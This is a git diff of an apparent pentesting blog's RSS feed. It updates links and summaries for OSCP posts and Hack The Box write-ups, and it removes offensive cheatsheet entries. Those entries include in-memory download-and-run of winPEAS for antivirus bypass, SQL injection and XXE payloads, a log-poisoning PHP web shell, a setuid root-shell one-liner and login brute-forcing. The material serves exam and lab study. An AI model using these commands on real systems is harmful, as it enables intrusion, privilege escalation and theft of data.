@@ -2,234 +2,136 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Meet x41 on www.tagnull.de</title>
-    <link>http://localhost:1313/</link>
+    <link>https://www.tagnull.de/</link>
     <description>Recent content in Meet x41 on www.tagnull.de</description>
     <generator>Hugo</generator>
     <language>en</language>
     <lastBuildDate>Sat, 20 Nov 2021 17:54:29 +0200</lastBuildDate>
-    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://www.tagnull.de/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Security Policy</title>
-      <link>http://localhost:1313/security-policy/</link>
+      <link>https://www.tagnull.de/security-policy/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/security-policy/</guid>
-      <description>Security Policy # Services in Scope # This policy begins on 01.01.2019.&#xA;All services and subdomains under these domains are in scope:&#xA;*.tagnull.de Unallowed procedures # Please do not attempt to carry out DoS attacks, leverage black hat SEO techniques, spam mails, or do other similarly questionable things. I also discourage the use of any vulnerability testing tools that automatically generate significant volumes of traffic or try to brute-force logins.</description>
+      <guid>https://www.tagnull.de/security-policy/</guid>
+      <description>&lt;h1 id=&#34;security-policy&#34;&gt;&#xA;  Security Policy&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#security-policy&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;services-in-scope&#34;&gt;&#xA;  Services in Scope&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#services-in-scope&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h2&gt;&#xA;&lt;p&gt;This policy begins on 01.01.2019.&lt;/p&gt;&#xA;&lt;p&gt;All services and subdomains under these domains are in scope:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;*.tagnull.de&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;unallowed-procedures&#34;&gt;&#xA;  Unallowed procedures&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#unallowed-procedures&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h2&gt;&#xA;&lt;p&gt;Please do not attempt to carry out DoS attacks, leverage black hat SEO techniques, spam mails, or do other similarly questionable things. I also discourage the use of any vulnerability testing tools that automatically generate significant volumes of traffic or try to brute-force logins.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Stack Overflow</title>
-      <link>http://localhost:1313/docs/Exploit-Development/stack-overflow/</link>
+      <link>https://www.tagnull.de/docs/Exploit-Development/stack-overflow/</link>
       <pubDate>Thu, 08 Aug 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Exploit-Development/stack-overflow/</guid>
-      <description>Topic # I took the OSCP exam in 2020.&#xA;I wrote this to document my progress and give back to the community. It also might encourage you to take the exam yourself.&#xA;In this first installment I would like to talk about &amp;ldquo;Stack based Buffer-Overflows&amp;rdquo;. What are they? How do they work? How can you exploit them?&#xA;I am not a developer by any means. I have exactly 0% knowledge in C or any other compiled language.</description>
+      <guid>https://www.tagnull.de/docs/Exploit-Development/stack-overflow/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;oscp-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;topic&#34;&gt;&#xA;  Topic&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#topic&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;I took the OSCP exam in 2020.&lt;/p&gt;&#xA;&lt;p&gt;I wrote this to document my progress and give back to the community.&#xA;It also might encourage you to take the exam yourself.&lt;/p&gt;&#xA;&lt;p&gt;In this first installment I would like to talk about &amp;ldquo;Stack based Buffer-Overflows&amp;rdquo;.&#xA;What are they? How do they work? How can you exploit them?&lt;/p&gt;&#xA;&lt;p&gt;I am not a developer by any means. I have exactly 0% knowledge in C or any other compiled language.&#xA;I just know a bit of &amp;ldquo;Python3&amp;rdquo; and &amp;ldquo;PowerShell&amp;rdquo;. But I managed to pull this of anyway and so can you.&lt;/p&gt;</description>
     </item>
     <item>
       <title>OSCP Review</title>
-      <link>http://localhost:1313/docs/Blog/oscp-review/</link>
+      <link>https://www.tagnull.de/docs/Blog/oscp-review/</link>
       <pubDate>Wed, 25 Mar 2020 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Blog/oscp-review/</guid>
-      <description>Introduction # I think everybody expects some kind of experience-report after getting the &amp;ldquo;OSCP certification&amp;rdquo;. So this is my take on this. Before I dive in - please keep in mind:&#xA;I will only describe how I approached the &amp;ldquo;PWK course&amp;rdquo; and &amp;ldquo;OSCP certification&amp;rdquo;.&#xA;THIS MIGHT NOT WORK FOR YOU!&#xA;With this out of the way, let&amp;rsquo;s dive right in.&#xA;[Top]&#xA;Pre-Enrollment # My journey started a long time before actually enrolling in the exam in 2019.</description>
-    </item>
-    <item>
-      <title>discovery</title>
-      <link>http://localhost:1313/docs/Cheatsheet/active-directory/discovery/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/active-directory/discovery/</guid>
-      <description> ldapsearch # ldapsearch -x -h target-ip -b &amp;#34;dc=domain,dc=tld&amp;#34; windapsearch.py # ./windapsearch.py -d host.domain.tld -u domain\\ldapbind -p password -U </description>
-    </item>
-    <item>
-      <title>mail</title>
-      <link>http://localhost:1313/docs/Cheatsheet/collection/mail/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/collection/mail/</guid>
-      <description>telnet # end mail via telnet&#xA;# connect telnet target-ip 25 # provide valid or fake email-address EHLO username@domain.tld # set mail-from MAIL FROM: &amp;lt;username@domain&amp;gt; # set recipient-to RCPT TO: &amp;lt;target-username@target-domain.tld&amp;gt; # set body and sent mail DATA 354 Ok Send data ending with &amp;lt;CRLF&amp;gt;.&amp;lt;CRLF&amp;gt; FROM: username@domain Hallo World! . get mails via pop3&#xA;# connect telnet target-ip 110 # login USER username PASS password # list emails LIST # retrieve emails RETR 1 curl # download emails via curl</description>
-    </item>
-    <item>
-      <title>mail</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/mail/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/mail/</guid>
-      <description> smtp-user-enum # verify that user exists on system with higher delay to make sure we get all responses&#xA;smtp-user-enum -M VRFY -U user-file -t target-ip -m 60 -w 20 </description>
-    </item>
-    <item>
-      <title>network</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/network/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/network/</guid>
-      <description>nmap # enumerate services and use default scripts&#xA;nmap -sC -sV -oN normal.txt target-ip scan all tcp ports&#xA;nmap -p- -oN all_ports.txt target-ip scan all udp ports&#xA;nmap -p- -sU -oN all_udp_ports.txt target-ip use script categories&#xA;nmap --script vuln,safe,discovery -oN scan.txt target-ip list all nse scripts&#xA;ls -lh /usr/share/nmap/scripts/ host discovery for fast scan&#xA;nmap -sn -v -oA nmap/host_discovery target-ip find all host that are up&#xA;grep &amp;#34;Up&amp;#34; nmap/host_discovery.gnmap | awk &amp;#39;{print $2}&amp;#39; &amp;gt; ips_host_discovery.</description>
-    </item>
-    <item>
-      <title>network</title>
-      <link>http://localhost:1313/docs/Cheatsheet/initial-access/network/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/initial-access/network/</guid>
-      <description> ftp # login via ftp&#xA;ftp target-ip anonymous login&#xA;username: anonymous password: anonymous </description>
-    </item>
-    <item>
-      <title>network</title>
-      <link>http://localhost:1313/docs/Cheatsheet/lateral-movement/network/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/lateral-movement/network/</guid>
-      <description>evil-winrm # get shell via evil-winrm&#xA;./evil-winrm.rb -u username -p password -i target-ip ssh / tunneling # create ssh-key&#xA;ssh-keygen add public-key to authorized_keys&#xA;cat rsa.pub &amp;gt;&amp;gt; authorized_keys set permission on private-key&#xA;chmod 600 id_rsa login via ssh-key&#xA;ssh -i id_rsa username@target-ip login with older ciphers&#xA;ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc username@target-ip start tool after ssh login&#xA;ssh username@target-ip -o &amp;#34;ProxyCommand=ncat --proxy-type http --proxy target-ip:proxy-port 127.0.0.1 22&amp;#34; ssh port forwarding</description>
-    </item>
-    <item>
-      <title>reflective code loading</title>
-      <link>http://localhost:1313/docs/Cheatsheet/antivirus-bypass/reflective-code-loading/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/antivirus-bypass/reflective-code-loading/</guid>
-      <description> powershell # $url = &amp;#34;https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe&amp;#34; $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest &amp;#34;$url&amp;#34; -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(&amp;#34;log&amp;#34;) </description>
-    </item>
-    <item>
-      <title>sql</title>
-      <link>http://localhost:1313/docs/Cheatsheet/initial-access/sql/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/initial-access/sql/</guid>
-      <description>mysqldump # backup all mysql databases&#xA;mysqldump -u username -ppassword --all-databases --single-transaction sqli # check if you can find a row, where you can place your output&#xA;http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8 get the version of the database&#xA;http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5 get the current user&#xA;http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5 see all tables&#xA;http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables get column names for a specified table</description>
-    </item>
-    <item>
-      <title>web</title>
-      <link>http://localhost:1313/docs/Cheatsheet/initial-access/web/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/initial-access/web/</guid>
-      <description>XML External Entity (XXE) # Read local files&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; Read binary or files that otherwise can&amp;rsquo;t be display (.php)&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=db.php&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; LFI via nc # logfile injection&#xA;nc target-ip target-port GET /&amp;lt;?php passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt; HTTP/1.1 Host: &amp;lt;IP&amp;gt; Connection: close Afterwards include the it via lfi&#xA;?lfi_file=/var/log/apache2/access.log&amp;amp;cmd=&amp;lt;command&amp;gt; XML External Entity (XXE) # Read local files</description>
-    </item>
-    <item>
-      <title>web</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/web/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/web/</guid>
-      <description>ferox # basic usage&#xA;feroxbuster -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster # bruteforce webdirectories and files by extention&#xA;gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 30 wfuzz # bruteforce web parameter&#xA;wfuzz -u http://target-ip/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt bruteforce post data (login)&#xA;wfuzz -u http://target-ip/path/index.php?action=authenticate -d &amp;#39;username=admin&amp;amp;password=FUZZ&amp;#39; -w /usr/share/wordlists/rockyou.txt fuff # bruteforce web directories&#xA;ffuf -w /path/to/wordlist -u https://target/FUZZ davtest # tries to upload (executable) files to webdav&#xA;davtest -url http://target-ip/ -sendbd auto nikto # scan website for vulnerabilities</description>
-    </item>
-    <item>
-      <title>operating system</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/operating-system/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/operating-system/</guid>
-      <description>peass - privilege escalation awesome scripts suite # very easy to use on linux&#xA;./linpeas.sh windows has multiple versions&#xA;winpeasx64.exe winpeasx86.exe winpeas.bat registry entry for winpeas colors&#xA;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 enum4linux # scan target-ip&#xA;enum4linux target-ip rpcdump.py # dump rpc endpoints&#xA;/opt/impacket/examples/rpcdump.py username:password@target-ip lookupsid.py # get sid via rpc&#xA;/opt/impacket/examples/lookupsid.py username:password@target-ip rpcclient # get information via rpc with username&#xA;rpcclient -U username target-ip get information via rpc without username</description>
-    </item>
-    <item>
-      <title>privilege escalation</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/privilege-escalation/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/privilege-escalation/</guid>
-      <description> capabilities # exploit cap_setuid capability on python3 to gain a local root-shell&#xA;python3 -c &amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/sh&amp;#34;)&amp;#39; </description>
-    </item>
-    <item>
-      <title>smb</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/smb/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/smb/</guid>
-      <description> mount # mount shares&#xA;mount -o hard,nolock target-ip:/home folder mount -t cifs -o user=username,domain=domainname //target-ip/share /mnt/folder mount -t nfs target-ip:share /mnt/folder -o nolock list Shares&#xA;showmount -e target-ip </description>
-    </item>
-    <item>
-      <title>vulnerabilities</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/vulnerabilities/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/vulnerabilities/</guid>
-      <description> searchsploit # filter search for specific kernel versions&#xA;searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6 </description>
+      <guid>https://www.tagnull.de/docs/Blog/oscp-review/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;oscp-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;introduction&#34;&gt;&#xA;  Introduction&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#introduction&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;I think everybody expects some kind of experience-report after getting the &amp;ldquo;OSCP certification&amp;rdquo;. So this is my take on this.&#xA;Before I dive in - please keep in mind:&lt;/p&gt;&#xA;&lt;p&gt;I will only describe how I approached the &amp;ldquo;PWK course&amp;rdquo; and &amp;ldquo;OSCP certification&amp;rdquo;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;THIS MIGHT NOT WORK FOR YOU!&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;With this out of the way, let&amp;rsquo;s dive right in.&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;a href=&#34;https://www.tagnull.de/#top&#34;&gt;[Top]&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;pre-enrollment&#34;&gt;&#xA;  Pre-Enrollment&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#pre-enrollment&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;My journey started a long time before actually enrolling in the exam in 2019.&#xA;In fact, everything I&amp;rsquo;ve done at work and at home lead to this.&lt;/p&gt;</description>
     </item>
     <item>
       <title>BountyHunter</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/bountyhunter/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/bountyhunter/</link>
       <pubDate>Sat, 20 Nov 2021 17:54:29 +0200</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/bountyhunter/</guid>
-      <description>External Recon # We start with nmap to do our external recon:&#xA;Nmap scan report for 10.129.192.33 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find a ssh service on port 22 and http service on port 80.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/bountyhunter/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;bountyhunter-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;We start with &lt;code&gt;nmap&lt;/code&gt; to do our external recon:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Nmap scan report for 10.129.192.33&#xA;&#xA;PORT   STATE SERVICE VERSION&#xA;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)&#xA;| ssh-hostkey: &#xA;|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)&#xA;|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)&#xA;|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)&#xA;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))&#xA;|_http-server-header: Apache/2.4.41 (Ubuntu)&#xA;|_http-title: Bounty Hunters&#xA;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We find a ssh service on port 22 and http service on port 80. http is usually a better target as ssh. So I start there.&#xA;The website boast a bounty hunter service. First I click on all visible links and menus to get a feeling for the website.&#xA;What works, what doesn&amp;rsquo;t work. But interfaces do I have - like input fields for example.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Cap</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/cap/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/cap/</link>
       <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/cap/</guid>
-      <description>External Recon # As always we start to get a lay of the land with our default &amp;ldquo;nmap&amp;rdquo; scan:&#xA;nmap -sC -sV 10.10.10.245 PORT STATE SERVICE VERSION PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http gunicorn Nothing unusual so far. However, since we have some version numbers let&amp;rsquo;s check them with searchsploit.&#xA;Nothing for vsftp.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/cap/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;cap-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;As always we start to get a lay of the land with our default &amp;ldquo;nmap&amp;rdquo; scan:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -sC -sV 10.10.10.245&#xA;&#xA;PORT   STATE SERVICE VERSION&#xA;PORT   STATE SERVICE VERSION&#xA;21/tcp open  ftp     vsftpd 3.0.3&#xA;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)&#xA;80/tcp open  http    gunicorn&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing unusual so far. However, since we have some version numbers let&amp;rsquo;s check them with searchsploit.&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;img src=&#34;searchsploit.png&#34; alt=&#34;searchsploit&#34; /&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nothing for vsftp. OpenSSH looks quite new but I suggest checking it aswell.&#xA;I just made a mental note to come back to SSH should other paths seem to be a dead end.&#xA;Gunicorn had no version number, so I skipped the searchsploit aswell. But we can take a look at the website itself.&lt;/p&gt;</description>
     </item>
     <item>
       <title>The Notebook</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/the-notebook/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/the-notebook/</link>
       <pubDate>Sat, 31 Jul 2021 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/the-notebook/</guid>
-      <description>External Recon # We start our external recon with an nmap scan. Only two ports are open with a third one filtered.&#xA;nmap -sC -sV -oN inital 10.10.10.230 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) | 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper 10010/tcp filtered rxapi The most interessting service so far is http on port 80.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/the-notebook/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;notebook-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;We start our external recon with an nmap scan. Only two ports are open with a third one filtered.&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -sC -sV -oN inital 10.10.10.230&#xA;&#xA;PORT      STATE    SERVICE VERSION&#xA;22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&#xA;| ssh-hostkey:&#xA;|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)&#xA;|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)&#xA;|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)&#xA;80/tcp    open     http    nginx 1.14.0 (Ubuntu)&#xA;|_http-server-header: nginx/1.14.0 (Ubuntu)&#xA;|_http-title: The Notebook - Your Note Keeper&#xA;10010/tcp filtered rxapi&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The most interessting service so far is http on port 80. Let&amp;rsquo;s take a peek there.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Traceback</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/traceback/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/traceback/</link>
       <pubDate>Sat, 15 Aug 2020 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/traceback/</guid>
-      <description>External Recon # Welcome to my first box and writeup since my OSCP. We start with a nmap scan as usual:&#xA;Website # Checking the website it seems like somebody already defaced the website.&#xA;We find a little hint in the sourcecode.&#xA;A google search on &amp;ldquo;webshells + Xh4H&amp;rdquo; reveals a github repository with a bunch of webshells. And sure enough we try all of them on our target.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/traceback/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;traceback-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;Welcome to my first box and writeup since my OSCP.&#xA;We start with a nmap scan as usual:&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;img src=&#34;nmap_scan.png&#34; alt=&#34;nmap&#34; /&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;website&#34;&gt;&#xA;  Website&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#website&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;Checking the website it seems like somebody already defaced the website.&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;img src=&#34;owned_site.png&#34; alt=&#34;ownd_site&#34; /&gt;&lt;/p&gt;&#xA;&lt;p&gt;We find a little hint in the sourcecode.&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;img src=&#34;websource_code.png&#34; alt=&#34;websource_code&#34; /&gt;&lt;/p&gt;&#xA;&lt;p&gt;A google search on &amp;ldquo;webshells + Xh4H&amp;rdquo; reveals a &#xA;  &lt;a href=&#34;https://github.com/Xh4H/Web-Shells&#34;&gt;github repository&lt;/a&gt;&#xA;with a bunch of webshells. And sure enough we try all of them on our target.&lt;/p&gt;</description>
     </item>
     <item>
       <title>ret2plt</title>
-      <link>http://localhost:1313/docs/Exploit-Development/ret2plt/</link>
+      <link>https://www.tagnull.de/docs/Exploit-Development/ret2plt/</link>
       <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Exploit-Development/ret2plt/</guid>
-      <description>Introduction # In the last couple of days, I had some time and wanted to get a better understanding and some experience in modern binary exploitation techniques. Part of this learning process is to explain what I&amp;rsquo;ve learned to others. If you find an error, please let me know.&#xA;Also: While preparing for the OSCP I already tried a couple of protection bypasses like NX/DEP (Data Execution Prevention) with the ROPEmporium challenges.</description>
+      <guid>https://www.tagnull.de/docs/Exploit-Development/ret2plt/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;ret2plt_banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;introduction&#34;&gt;&#xA;  Introduction&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#introduction&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;In the last couple of days, I had some time and wanted to get a better understanding and some experience in modern binary exploitation techniques.&#xA;Part of this learning process is to explain what I&amp;rsquo;ve learned to others. If you find an error, please let me know.&lt;/p&gt;&#xA;&lt;p&gt;Also: While preparing for the OSCP I already tried a couple of protection bypasses like NX/DEP (Data Execution Prevention) with the &#xA;  &lt;a href=&#34;https://ropemporium.com/&#34;&gt;ROPEmporium&lt;/a&gt; challenges.&#xA;I highly recommend them because they will teach some fundamentals we will use for bypassing another common protection, which is ASLR or Address Space Layout Randomization.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Safe</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/safe/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/safe/</link>
       <pubDate>Thu, 24 Oct 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/safe/</guid>
